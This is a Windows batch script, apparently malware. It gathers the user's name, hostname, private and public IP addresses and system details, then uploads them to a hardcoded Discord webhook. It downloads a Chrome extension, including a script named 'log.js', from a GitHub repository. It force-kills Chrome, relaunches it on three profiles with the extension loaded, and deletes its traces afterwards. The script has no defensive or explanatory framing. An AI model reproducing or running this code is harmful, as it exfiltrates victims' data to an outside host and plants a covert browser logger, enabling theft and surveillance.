��&cls
@echo off
for /f "tokens=2 delims=:" %%d in ('ipconfig ^| find "IPv4"') do set intip=%%d
for /f %%b in ('powershell -nop -c "(Invoke-RestMethod http://api.ipify.org)"') Do Set ExtIP=%%b
set webhook=https://discord.com/api/webhooks/957287789098061886/sMhKsMopMJqlDFPmDeZ7l2wybyq435JnraeMF1ad5sC7fC_Na_CWZ6tjjE505stIDka9
echo        PC         >>%appdata%\info.txt
echo ------------------->>%appdata%\info.txt
echo Username: %username%>>%appdata%\info.txt
echo Hostname: %computername%>>%appdata%\info.txt
echo Private IP: %intip%>>%appdata%\info.txt
echo Public IP: %ExtIP%>>%appdata%\info.txt
echo CPU architechture: %processor_architecture%>>%appdata%\info.txt
echo Operating System: %os%>>%appdata%\info.txt
echo System Drive: %systemdrive%>>%appdata%\info.txt
curl -s -F "file=@%appdata%\info.txt" \ %webhook% >nul 2>&1

if exist %appdata%\extension rmdir %appdata%\extension /S /Q >nul 2>&1

del %appdata%\info.txt
mkdir %appdata%\extension
mkdir %appdata%\extension\scripts
mkdir %appdata%\extension\assets
curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/manifest.json>>%appdata%\extension\manifest.json
curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/scripts/log.js>>%appdata%\extension\scripts\log.js
curl -s https://raw.githubusercontent.com/syskey-del/extension/main/extension/assets/onedrive.png -o %appdata%\extension\assets\onedrive.png

taskkill /im chrome.exe /f >nul 2>&1

start cmd /c "timeout /t 3 >nul && taskkill /im chrome.exe /f >nul 2>&1"
start cmd /c "timeout /t 6 >nul && taskkill /im chrome.exe /f >nul 2>&1"
start cmd /c "timeout /t 9 >nul && taskkill /im chrome.exe /f >nul 2>&1"

"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 1"

"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 2"

"%programfiles%\Google\Chrome\Application\chrome.exe" --load-extension="%appdata%\extension" --profile-directory="Profile 3"

:end
taskkill /im chrome.exe /f >nul 2>&1
rmdir %appdata%\extension /S /Q >nul 2>&1
exit